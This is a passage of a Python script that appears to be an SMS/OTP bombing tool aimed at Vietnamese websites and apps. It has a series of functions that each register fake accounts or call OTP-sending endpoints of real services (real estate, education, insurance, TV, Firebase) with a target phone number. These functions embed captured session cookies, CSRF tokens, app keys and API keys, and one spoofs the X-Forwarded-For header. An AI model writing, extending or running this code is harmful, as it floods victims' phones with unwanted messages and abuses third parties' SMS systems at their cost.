        # 'Cookie': 'XSRF-TOKEN=eyJpdiI6IjRtck1EbDlmVVgwMUR6dWRBWWdLclE9PSIsInZhbHVlIjoibE1NUnk4LzBEcnpQWEJxemc1Ujgyb0paV0F1bWRMNGQreTMwU2U0WWxNb1hPNDluaUJXcTlFSk51TzhFcENZVzlCSEgrbFdkK01Ra2FOVndHemthZVlyY2ZUMUpoTzZ2ajNob05penI4WDhlU2NOZjZOM0F2b1Rpdk1IeitEcisiLCJtYWMiOiJhN2MyMTFjOGI5ZTFkZTZkMmFlNDQ2YWU3NzkxNTEyNzc5YjNiNjY5OWMyNDkzNDM1Y2QxNTliOWMzZWFkNGIyIiwidGFnIjoiIn0%3D; nhadatvui_session=eyJpdiI6IjhKdU53dkJEN0ExU2g2ajhZTUU1RWc9PSIsInZhbHVlIjoiZ2xlMUtIVklZVG4wbmI5MFFJRXJ6NVlGWjkrczQ3cjdUUU5CYlFUSmoyVjIya1VsNnplaUZPREkvaklDT1c4YXBoUTljRFF0OUNlTHBqTWVnejMvdmI1SkdUY2hEeUVMY29qNlJDSnlFMjdPNXFsaWt2ZUt1WkJtYTdNMmhJUGciLCJtYWMiOiI1MDBmYzhlNDJiNGQ4MzBlNGZlM2NhZmVlZTRhY2Q4Y2RkMTQ1OTVlY2YzZjkwYjEwMmJiZjk0YjI2ZGY5MzkxIiwidGFnIjoiIn0%3D',
        'Origin': 'https://nhadatvui.vn',
        'Referer': 'https://nhadatvui.vn/user/register/phone',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'sec-ch-ua': '"Opera";v="116", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        '_token': 'g5n9m9gJNIexHjrCiRgAujIM9cu5n9eRn3h26UGP',
        'g-token': '',
        'phone': sdt,
        'password': '123123aA@',
    }

    try:
        response = requests.post('https://nhadatvui.vn/user/register/phone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("NHADATVUI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("NHADATVUI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thuongdo():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'origin': 'https://client.hangve.com',
        'priority': 'u=1, i',
        'referer': 'https://client.hangve.com/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-organization': 'https://client.hangve.com',
    }
    random_email = generate_random_email()
    json_data = {
        'email': random_email,
        'password': '123123aA@',
        'name': 'tran dat',
        'phone_number': sdt,
        'warehouse_id': 1,
        'service': 1,
    }

    response = requests.post('https://api-client.hangve.com/api/auth/sign-up/', headers=headers, json=json_data)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer',
        'origin': 'https://client.hangve.com',
        'priority': 'u=1, i',
        'referer': 'https://client.hangve.com/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-organization': 'https://client.hangve.com',
    }

    try:
        response = requests.get(f'https://api-client.hangve.com/api/auth/reset-password/by-phone/{sdt}', headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THUONGDO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THUONGDO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def unica(): #ap
    headers = {
        'Host': 'id.unica.vn',
        'accept': 'application/json',
        'content-type': 'application/json',
        'user-agent': 'Unica/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }
    random_email = generate_random_email()
    json_data = {
        'full_name': 'huytrrrrddf',
        'email': random_email,
        'password': 'tttyyyuuu',
        'phone': sdt_chuyen_doi,
    }

    response = requests.post('https://id.unica.vn/api/users', headers=headers, json=json_data)
    headers = {
        'Host': 'id.unica.vn',
        'accept': 'application/json',
        'content-type': 'application/json',
        'user-agent': 'Unica/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://id.unica.vn/api/get-pin-code', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("UNICA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("UNICA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def monkeyjunior(): #ap; nhieu ap phet
    headers = {
        'Host': 'app.monkeyenglish.net',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        'lang': 'vi-VN',
    }

    json_data = {
        'app_id': 2,
        'device_id': '104547954',
        'os': 'ios',
        'info': 'Application Version: 42.0.84 OS: ios Model: iPhone 7 System Version: 15.8.2',
        'subversion': '42.0.84',
        'device_type': 2,
        'is_test': False,
        'os_name': 'iOS',
        'type': 3,
        'phone': sdt[1:10],
        'password': '123123aa@',
        'country_code': '+84',
        'is_upgrade': False,
    }

    response = requests.post(
        'https://app.monkeyenglish.net/app/api/v2/account/authen/register',
        params=params,
        headers=headers,
        json=json_data,
    )
    headers = {
        'Host': 'app.monkeyenglish.net',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        'lang': 'vi-VN',
    }

    json_data = {
        'app_id': 2,
        'device_id': '104547954',
        'os': 'ios',
        'info': 'Application Version: 42.0.84 OS: ios Model: iPhone 7 System Version: 15.8.2',
        'subversion': '42.0.84',
        'device_type': 2,
        'is_test': False,
        'os_name': 'iOS',
        'type': 1,
        'country_code': '+84',
        'phone': sdt[1:10],
        'email': '',
    }

    try:
        response = requests.post(
            'https://app.monkeyenglish.net/app/api/v1/account/send-opt-verify-pw',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MONKEYJUNIOR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MONKEYJUNIOR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def babilala():
    headers = {
        'Host': 'api.babilala.vn',
        'phone': sdt,
        'accept': '*/*',
        'lang': 'vi',
        'content-type': 'application/x-www-form-urlencoded',
        'x-unity-version': '2019.3.15f1',
        'user-agent': 'babilala/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    try:
        response = requests.post('https://api.babilala.vn/api/getOtp', headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BABILALA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BABILALA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def edupia(): #ap
    headers = {
        'Host': 'service3.edupia.vn',
        'accept': '*/*',
        'content-type': 'application/json',
        'x-unity-version': '2020.3.48f1',
        'user-agent': 'EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
        'access-control-allow-origin': '*',
    }

    json_data = {
        'app_code': 'edupia_cap1',
        'app_version': '4.4.28',
        'device_os': 'Other',
        'device_model': 'iOS1582',
        'user_agent': '',
        'device_id': '90717ADD-D733-4132-AAF7-FB696FFE43AA',
        'device_name': 'thanh',
        'ip': '',
        'user_id': 0,
        'ApiCache': {
            'ip_cache': {
                'client_ip': '',
                'client_ip_long': '',
                'country_code': '',
                'country_name': '',
                'region_name': '',
                'latitude': '',
                'longitude': '',
                'time_zone': '',
                'zip_ocd': '',
            },
        },
        'file': [],
        'parent_name': 'dat sen',
        'phone': sdt,
        'product_type': '1',
        'deviceId': '',
        'source_register': 'App C1',
        'campaign_name': 'Inhouse_Edupia TH App_Há»�c thá»\xad_V2_Ä�Äƒng kÃ½',
        'product_register': -1,
        'username': '',
        'utm_source': '',
    }

    response = requests.post(
        'https://service3.edupia.vn/service/v2/users/2.1/register/create-user-trial',
        headers=headers,
        json=json_data,
    )
    cookies = {
        '_ga': 'GA1.2.1688129155.1735460145',
        '_gat_UA-116690073-3': '1',
        '_gcl_au': '1.1.1852251882.1735460145',
        '_gid': 'GA1.2.1381524696.1735460145',
    }

    headers = {
        'Host': 'api-cms-core.edupia.vn',
        # 'Cookie': '_ga=GA1.2.1688129155.1735460145; _gat_UA-116690073-3=1; _gcl_au=1.1.1852251882.1735460145; _gid=GA1.2.1381524696.1735460145',
        'accept': '*/*',
        'content-type': 'application/json',
        'x-unity-version': '2020.3.48f1',
        'user-agent': 'EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
        'access-control-allow-origin': '*',
    }

    json_data = {
        'app_code': 'edupia_cap1',
        'app_version': '4.4.28',
        'device_os': 'Other',
        'device_model': 'iOS1582',
        'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'device_id': '90717ADD-D733-4132-AAF7-FB696FFE43AA',
        'device_name': 'thanh',
        'ip': '',
        'user_id': 0,
        'ApiCache': {
            'ip_cache': {
                'client_ip': '',
                'client_ip_long': '',
                'country_code': '',
                'country_name': '',
                'region_name': '',
                'latitude': '',
                'longitude': '',
                'time_zone': '',
                'zip_ocd': '',
            },
        },
        'file': [],
        'phone': sdt,
        'operation': 3,
    }

    try:
        response = requests.post(
            'https://api-cms-core.edupia.vn/api/v2/authentication/get-vcode',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("EDUPIA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("EDUPIA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vkids(): #ap
    headers = {
        'Host': 'payment.api.deltago.com',
        'X-Unity-Version': '2021.3.12f1',
        'Accept': '*/*',
        'app_version': '2.13.0',
        'device_info': 'iPhone9,3',
        'lang_code': 'vi',
        'user_id': '0',
        'bundleid': 'com.vkids.ios.abctiengviet',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'platform': '1',
        'app_info': '2.13.0',
        'User-Agent': 'VkidsABC/2.13.0.1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'country_code': 'VN',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'phone': sdt[1:10],
        'appKey': 'Ydfa76f765SA46HAA56sHFDMF8K4S5IK',
        'app_id': 'com.vkids.ios.abctiengviet',
    }

    try:
        response = requests.post('http://payment.api.deltago.com/api/auth/get-otp-vmg', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VKIDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VKIDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mytv():
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Access-Control-Allow-Origin': '*',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Macaddress': '1efca607-2227-610e-9234-109156bec4fb',
        'Origin': 'https://mytv.com.vn',
        'Referer': 'https://mytv.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'device_model': 'Browser',
        'device_type': 127,
        'email': '',
        'login_type': '1',
        'phone': sdt,
        'type': '1',
    }

    try:
        response = requests.post(
            'https://apigw.mytv.vn/api/v1/authen-handle/sendOTP?&uuid=64e8c0d4-c73b-4158-8513-ca4519d9e826',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYTV | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYTV | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def cathaylife():
    cookies = {
        'TS01f67c5d': '0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555',
        'JSESSIONID': 'QXaao33SxRv3Ag0OYonbPE6d.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'dtCookies05g7k3y': 'v_4_srv_1_sn_394FDFD95DC05D18FC363F15F943EBB9_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1',
        'BIGipServerB2C_http': '!exmKDAWgt+BvyVjRrhDcHTnwa9KJ8dX1VrymLFuvhZFmAgzYJv4C7yoyyLs5rrnuzL+6BJJLRW387w==',
        'INITSESSIONID': '027279fa9c4b49c532cab7766a507b45',
        'TS0173f952': '0110512fd7c148a6fb3692b2b5119cffb84b239c53bdfb293146215cc30f047366ba951d13aabe14f131bc7a76dc30465f75cacac3',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        # 'Cookie': 'TS01f67c5d=0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555; JSESSIONID=QXaao33SxRv3Ag0OYonbPE6d.06283f0e-f7d1-36ef-bc27-6779aba32e74; dtCookies05g7k3y=v_4_srv_1_sn_394FDFD95DC05D18FC363F15F943EBB9_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; BIGipServerB2C_http=!exmKDAWgt+BvyVjRrhDcHTnwa9KJ8dX1VrymLFuvhZFmAgzYJv4C7yoyyLs5rrnuzL+6BJJLRW387w==; INITSESSIONID=027279fa9c4b49c532cab7766a507b45; TS0173f952=0110512fd7c148a6fb3692b2b5119cffb84b239c53bdfb293146215cc30f047366ba951d13aabe14f131bc7a76dc30465f75cacac3',
        'Origin': 'https://www.cathaylife.com.vn',
        'Referer': 'https://www.cathaylife.com.vn/CPWeb/portal/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Opera";v="116", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': sdt,
        'email': 'quadeptraidi@gmail.com',
        'LINK_FROM': 'signUp2',
        'CUSTOMER_NAME': 'Natsuno Suki',
        'memberID': '',
        'POL_HOLDER_NUM': 'undefined',
        'LANGS': 'vi_VN',
    }

    try:
        response = requests.post(
            'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/sendOTP',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()
        print("CATHAY LIFE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CATHAY LIFE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def cathayliferesend():
    cookies = {
        'TS01f67c5d': '0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555',
        'JSESSIONID': 'QXaao33SxRv3Ag0OYonbPE6d.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'dtCookies05g7k3y': 'v_4_srv_1_sn_394FDFD95DC05D18FC363F15F943EBB9_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1',
        'BIGipServerB2C_http': '!exmKDAWgt+BvyVjRrhDcHTnwa9KJ8dX1VrymLFuvhZFmAgzYJv4C7yoyyLs5rrnuzL+6BJJLRW387w==',
        'INITSESSIONID': '027279fa9c4b49c532cab7766a507b45',
        'TS0173f952': '0110512fd7c148a6fb3692b2b5119cffb84b239c53bdfb293146215cc30f047366ba951d13aabe14f131bc7a76dc30465f75cacac3',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        # 'Cookie': 'TS01f67c5d=0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555; JSESSIONID=QXaao33SxRv3Ag0OYonbPE6d.06283f0e-f7d1-36ef-bc27-6779aba32e74; dtCookies05g7k3y=v_4_srv_1_sn_394FDFD95DC05D18FC363F15F943EBB9_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; BIGipServerB2C_http=!exmKDAWgt+BvyVjRrhDcHTnwa9KJ8dX1VrymLFuvhZFmAgzYJv4C7yoyyLs5rrnuzL+6BJJLRW387w==; INITSESSIONID=027279fa9c4b49c532cab7766a507b45; TS0173f952=0110512fd7c148a6fb3692b2b5119cffb84b239c53bdfb293146215cc30f047366ba951d13aabe14f131bc7a76dc30465f75cacac3',
        'Origin': 'https://www.cathaylife.com.vn',
        'Referer': 'https://www.cathaylife.com.vn/CPWeb/portal/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Opera";v="116", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'memberMap': f'{{"userName":"quadeptraidi@gmail.com","password":"123123aA@","birthday":"10/12/1998","certificateNumber":"001203504665","phone":"{sdt}","email":"quadeptraidi@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Natsuno Suki"}}',
        'OTP_TYPE': 'P',
        'LANGS': 'vi_VN',
    }

    try:
        response = requests.post(
            'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()
        print("CATHAY RESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CATHAY RESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def prepedu():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://prepedu.com',
        'priority': 'u=1, i',
        'referer': 'https://prepedu.com/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-forwarded-for': '171.224.177.243, 172.17.29.253',
        'x-locale': 'vi',
    }

    params = ''

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://accounts.prep.vn/api/v1/auth/phone-otp/login', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PREPEDU | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PREPEDU | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bigm():
    cookies = {
        'bigm_session': 'eyJpdiI6Im9lZHJxSElcL3Zydk5VYnlxVGE2TUtRPT0iLCJ2YWx1ZSI6ImhnXC9QUW9hSkR6TEdMUm5NYXVXang5VXhHZGhFeGo2MWVZV1FXNGU0aWhcL1NBdTFtTXlXSWhZclRxQlNVMno3a3p6Z3BacmJFYzExdFZxV1wvN3lqa1FyMFBCamtaU0NSakN6QkdaWlJSQTkrd3pBQml5ejYrRmZOSnFSKzY2NmJJIiwibWFjIjoiYWZjYmFmZWQyODY0MTgwZTkxNGNlY2Q1NDcxMjM0NDViMzYxNGFmMzk2N2RhZTViYzYxYWIyZTBjNTYwMjY3ZCJ9',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'bigm_session=eyJpdiI6Im9lZHJxSElcL3Zydk5VYnlxVGE2TUtRPT0iLCJ2YWx1ZSI6ImhnXC9QUW9hSkR6TEdMUm5NYXVXang5VXhHZGhFeGo2MWVZV1FXNGU0aWhcL1NBdTFtTXlXSWhZclRxQlNVMno3a3p6Z3BacmJFYzExdFZxV1wvN3lqa1FyMFBCamtaU0NSakN6QkdaWlJSQTkrd3pBQml5ejYrRmZOSnFSKzY2NmJJIiwibWFjIjoiYWZjYmFmZWQyODY0MTgwZTkxNGNlY2Q1NDcxMjM0NDViMzYxNGFmMzk2N2RhZTViYzYxYWIyZTBjNTYwMjY3ZCJ9',
        'Origin': 'https://base.bigm.vn',
        'Referer': 'https://base.bigm.vn/register/step2?id=367',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://base.bigm.vn/api/send-sms/opt', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BIGM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIGM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def homedy():
    headers = {
        'Host': 'sso.homedy.com',
        'content-type': 'application/json',
        'x-client-bundle': 'com.Homedy.Mobile',
        'accept': 'application/json',
        'x-client-version': '3.7.1',
        'x-client-app-code': 'homedy',
        'accept-language': 'vi-VN,vi;q=0.9',
        'x-client-locale': 'vi',
        'user-agent': 'HomedyApp/241015 CFNetwork/1494.0.7 Darwin/23.4.0',
        'x-device-id': 'EF7DF7A4-A404-448F-81D8-3B98952F7428',
    }

    json_data = {
        'Mobile': sdt,
        'TypeId': 3,
    }

    try:
        response = requests.post('https://sso.homedy.com/User/SendOTP', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOMEDY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOMEDY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def atmnha():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://atmnha.vn',
        'priority': 'u=1, i',
        'referer': 'https://atmnha.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    }

    json_data = {
        'operationName': 'sendCode',
        'variables': {
            'phone': sdt,
            'type': 'signUp',
            'identifier': 'identifier',
        },
        'query': 'mutation sendCode($phone: String!, $type: SendVerificationCodeType, $identifier: String!) {\n  sendCode(phone: $phone, type: $type, identifier: $identifier) {\n    payload\n    success\n    msg\n    __typename\n  }\n}',
    }

    try:
        response = requests.post('https://api.realtech247.com/v1/users/graphql', headers=headers, json=json_data)
        response.raise_for_status()
        print("ATMNHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ATMNHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def dynaminds(): #ap
    headers = {
        'Host': 'api.dynaminds.vn',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Dynamic%20%20%20Hosting/1.4.1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept-Language': 'vi',
    }

    json_data = {
        'phone_number': sdt,
        'provider': 'self',
    }

    try:
        response = requests.post('https://api.dynaminds.vn/api/v1/oauth/register', headers=headers, json=json_data)
        response.raise_for_status()
        print("DYNAMINDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DYNAMINDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gicula(): #ap
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/10.7.0/FirebaseCore-iOS',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-ios-bundle-identifier': 'com.gicula.gicula',
        'x-firebase-gmpid': '1:441632033845:ios:061257dd081a2a584d357c',
        'user-agent': 'FirebaseAuth.iOS/10.7.0 com.gicula.gicula/1.0.0 iPhone/17.4.1 hw/iPhone11_8',
        'accept-language': 'en',
    }

    params = {
        'key': 'AIzaSyArzuGpJSuQjY4BTPYKYvWbwhQyj-kqASc',
    }

    json_data = {
        'iosReceipt': 'AEFDNu8_Yf8zrW2KgVdtcYc_ZbgQNUfodc5BwLciW683p90mtt9WQ003Jl9exctAUMbeoOohuoh0F0dsLqXXl338Wr5lLApbo0PO2J5P89VV9WlqZbp7tYUie2rDvMw',
        'iosSecret': 'dQffunpOd3g77AuP',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()
        print("GICULA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GICULA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def dalatbds(): #ap
    headers = {
        'Host': 'www.googleapis.com',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-client-version': 'iOS/FirebaseSDK/10.15.0/FirebaseCore-iOS',
